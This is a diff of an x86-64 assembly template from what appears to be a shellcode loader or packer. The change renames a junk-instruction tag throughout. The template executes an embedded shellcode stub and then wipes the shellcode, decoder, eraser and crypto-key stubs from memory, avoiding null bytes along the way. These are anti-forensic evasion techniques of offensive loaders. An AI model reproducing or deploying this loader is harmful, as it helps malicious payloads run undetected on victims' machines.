@@ -22,70 +22,70 @@ entry:
 
   // erase useless functions and entry
  flag_eraser_1:
-  lea rcx, [rbx + mini_xor]          {{igi}}
-  mov rdx, eraser_stub - mini_xor    {{igi}}
-  call eraser_stub                   {{igi}}
+  lea rcx, [rbx + mini_xor]          {{iji}}
+  mov rdx, eraser_stub - mini_xor    {{iji}}
+  call eraser_stub                   {{iji}}
 
-  mov rcx, rbx                       {{igi}}
-  mov rdx, flag_eraser_1             {{igi}}
-  call eraser_stub                   {{igi}}
+  mov rcx, rbx                       {{iji}}
+  mov rdx, flag_eraser_1             {{iji}}
+  call eraser_stub                   {{iji}}
 
   // restore arguments for call shellcode
-  pop r9                             {{igi}}
-  pop r8                             {{igi}}
-  pop rdx                            {{igi}}
-  pop rcx                            {{igi}}
+  pop r9                             {{iji}}
+  pop r8                             {{iji}}
+  pop rdx                            {{iji}}
+  pop rcx                            {{iji}}
 
   // ensure stack is 16 bytes aligned
-  push rbp                           {{igi}}
-  mov rbp, rsp                       {{igi}}
-  mov rax, rbp                       {{igi}}
-  and rax, 0x0F                      {{igi}}
-  sub rsp, rax                       {{igi}}
+  push rbp                           {{iji}}
+  mov rbp, rsp                       {{iji}}
+  mov rax, rbp                       {{iji}}
+  and rax, 0x0F                      {{iji}}
+  sub rsp, rax                       {{iji}}
 
   // execute the shellcode
-  sub rsp, 0x80                      {{igi}}
-  call shellcode_stub                {{igi}}
-  add rsp, 0x80                      {{igi}}
+  sub rsp, 0x80                      {{iji}}
+  call shellcode_stub                {{iji}}
+  add rsp, 0x80                      {{iji}}
 
   // restore stack and rbp
-  mov rsp, rbp                       {{igi}}
-  pop rbp                            {{igi}}
+  mov rsp, rbp                       {{iji}}
+  pop rbp                            {{iji}}
 
   // save the shellcode return value
-  push rax                           {{igi}}
+  push rax                           {{iji}}
 
   // erase the shellcode stub
 {{if .EraseShellcode}}
-  lea rcx, [rbx + shellcode_stub]    {{igi}}
-  mov rdx, {{hex .ShellcodeLen}}     {{igi}}
-  call eraser_stub                   {{igi}}
+  lea rcx, [rbx + shellcode_stub]    {{iji}}
+  mov rdx, {{hex .ShellcodeLen}}     {{iji}}
+  call eraser_stub                   {{iji}}
 {{end}}
 
   // erase the above instructions
  flag_eraser_2:
-  mov rcx, rbx                       {{igi}}
+  mov rcx, rbx                       {{iji}}
   // prevent appear three 0x00
-  xor edx, edx                       {{igi}}
-  add dx, flag_eraser_2 + 8          {{igi}}
-  call eraser_stub                   {{igi}}
+  xor edx, edx                       {{iji}}
+  add dx, flag_eraser_2 + 8          {{iji}}
+  call eraser_stub                   {{iji}}
 
   // erase the eraser stub
-  lea rdi, [rbx + eraser_stub]       {{igi}}
-  lea rsi, [rbx + crypto_key_stub]   {{igi}}
+  lea rdi, [rbx + eraser_stub]       {{iji}}
+  lea rsi, [rbx + crypto_key_stub]   {{iji}}
   // prevent appear three 0x00
-  xor ecx, ecx                       {{igi}}
-  add cx, {{hex .EraserLen}}         {{igi}}
-  cld                                {{igi}}
-  rep movsb                          {{igi}}
+  xor ecx, ecx                       {{iji}}
+  add cx, {{hex .EraserLen}}         {{iji}}
+  cld                                {{iji}}
+  rep movsb                          {{iji}}
 
   // restore the shellcode return value
-  pop rax                            {{igi}}
+  pop rax                            {{iji}}
 
   // restore context
-  pop rbx                            {{igi}}
+  pop rbx                            {{iji}}
   {{db .RestoreContext}}
-  ret                                {{igi}}
+  ret                                {{iji}}
 
 // rcx = data address, rdx = data length, r8 = key.
 // this function assumes that the data length is divisible by 8.
@@ -137,12 +137,12 @@ erase_crypto_key_stub:
   ret
 
 decoder_stub:
-  {{db .DecoderStub}}                {{igi}}
+  {{db .DecoderStub}}                {{iji}}
 
 eraser_stub:
-  {{db .EraserStub}}                 {{igi}}
+  {{db .EraserStub}}                 {{iji}}
 
 crypto_key_stub:
-  {{db .CryptoKeyStub}}              {{igi}}
+  {{db .CryptoKeyStub}}              {{iji}}
 
 shellcode_stub:
